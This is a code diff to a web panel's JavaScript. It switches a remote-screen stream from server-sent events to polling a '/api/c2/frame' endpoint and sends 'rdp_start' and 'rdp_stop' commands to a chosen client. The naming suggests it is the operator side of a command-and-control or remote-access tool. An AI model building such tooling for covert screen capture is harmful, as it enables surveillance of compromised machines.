@@ -880,7 +880,8 @@
         const rdpStatus = document.getElementById('rdp-status');
         const rdpPlaceholder = document.getElementById('rdp-placeholder');
         const rdpFrame = document.getElementById('rdp-frame');
-        let rdpStream = null;
+        let rdpPollInterval = null;
+        let rdpLastTs = 0;
         let rdpRunning = false;
 
         rdpFpsSlider.addEventListener('input', () => {
@@ -903,9 +904,38 @@
             }
         });
 
+        async function fetchFrame() {
+            if (!rdpRunning) return;
+            try {
+                const res = await fetch('/api/c2/frame/' + encodeURIComponent(clientId) + '?ts=' + rdpLastTs);
+                if (res.status === 200) {
+                    const data = await res.json();
+                    if (data.b64) {
+                        rdpLastTs = data.ts;
+                        rdpFrame.src = 'data:image/jpeg;base64,' + data.b64;
+                        rdpFrame.style.display = 'block';
+                        rdpPlaceholder.style.display = 'none';
+                        rdpStatus.textContent = 'Streaming';
+                        rdpStatus.style.color = 'var(--success, #10b981)';
+                    }
+                } else if (res.status === 204 || res.status === 304) {
+                    // No new frame yet
+                    if (rdpStatus.textContent === 'Connecting...') {
+                        rdpStatus.textContent = 'Waiting for stream...';
+                    }
+                } else {
+                    rdpStatus.textContent = 'Stream error';
+                    rdpStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } catch {
+                rdpStatus.textContent = 'Connection error';
+                rdpStatus.style.color = 'var(--danger, #ef4444)';
+            }
+        }
+
         rdpToggleBtn.addEventListener('click', async () => {
             if (!rdpRunning) {
-                const fps = rdpFpsSlider.value;
+                const fps = parseInt(rdpFpsSlider.value) || 10;
                 const quality = rdpQualitySlider.value;
                 const mode = rdpModeSelect.value;
                 try {
@@ -915,27 +945,17 @@
                         body: JSON.stringify({ client_id: clientId, command: 'rdp_start:' + fps + ':' + quality + ':' + mode })
                     });
                     rdpRunning = true;
+                    rdpLastTs = 0;
                     rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="6" width="12" height="12" rx="2"/></svg> Stop';
                     rdpToggleBtn.classList.remove('btn-primary');
                     rdpToggleBtn.classList.add('btn-danger');
                     rdpStatus.textContent = 'Connecting...';
                     rdpStatus.style.color = 'var(--warning, #f59e0b)';
 
-                    if (rdpStream) rdpStream.close();
-                    rdpStream = new EventSource('/api/c2/stream/' + encodeURIComponent(clientId));
-                    rdpStream.onmessage = (e) => {
-                        if (e.data) {
-                            rdpFrame.src = 'data:image/jpeg;base64,' + e.data;
-                            rdpFrame.style.display = 'block';
-                            rdpPlaceholder.style.display = 'none';
-                            rdpStatus.textContent = 'Streaming';
-                            rdpStatus.style.color = 'var(--success, #10b981)';
-                        }
-                    };
-                    rdpStream.onerror = () => {
-                        rdpStatus.textContent = 'Connecting...';
-                        rdpStatus.style.color = 'var(--warning, #f59e0b)';
-                    };
+                    if (rdpPollInterval) clearInterval(rdpPollInterval);
+                    const pollDelay = Math.max(33, Math.floor(1000 / fps));
+                    rdpPollInterval = setInterval(fetchFrame, pollDelay);
+                    fetchFrame();
                 } catch {
                     rdpStatus.textContent = 'Failed to start';
                     rdpStatus.style.color = 'var(--danger, #ef4444)';
@@ -948,7 +968,7 @@
                         body: JSON.stringify({ client_id: clientId, command: 'rdp_stop' })
                     });
                 } catch {}
-                if (rdpStream) { rdpStream.close(); rdpStream = null; }
+                if (rdpPollInterval) { clearInterval(rdpPollInterval); rdpPollInterval = null; }
                 rdpRunning = false;
                 rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Stream';
                 rdpToggleBtn.classList.remove('btn-danger');
